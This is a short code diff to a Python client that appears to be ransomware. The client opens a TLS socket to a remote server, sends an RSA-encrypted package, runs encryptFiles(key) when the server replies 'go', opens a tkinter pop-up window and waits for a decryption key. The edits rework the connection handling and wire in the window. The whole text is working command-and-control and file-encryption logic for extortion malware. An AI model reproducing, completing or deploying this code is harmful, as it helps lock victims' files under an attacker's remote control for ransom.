@@ -9,7 +9,7 @@ import sys
 from threading import *
 import uuid
 import time
-#import interface
+from interface import App
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import PKCS1_OAEP
 
@@ -141,10 +141,15 @@ if __name__ == "__main__":
     PACKAGE = MESSAGE + " " + str(encrypted)
 
     # set up our socket to connect to the server
-    s = socket.create_connection((HOST, PORT))
-    secSock = context.wrap_socket(s, server_hostname="pwnd")
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    
+    print('hello')
+    try:
+        secSock = context.wrap_socket(s, server_hostname="pwnd")
+        secSock.connect((HOST, PORT))
+    except Exception as e:
+        print(e)
     print('Connected!')
-    print(bytes(PACKAGE, "utf-8"))
     secSock.send(bytes(PACKAGE, "utf-8"))
 
     while True:
@@ -165,10 +170,8 @@ if __name__ == "__main__":
                     if data.decode() == 'go':
                         print("encrypting")
                         encryptFiles(key)
-                    # set up thread for tkinter window
-                    #t1 = Thread(target=interface.App().pop_up_win)
-                    #t1.daemon = True
-                    #t1.start()
+                    #set up thread for tkinter window
+                    visual = App(secSock)
 
                     # recv waits for new input of key to decrypt
                     key = secSock.recv(4096)
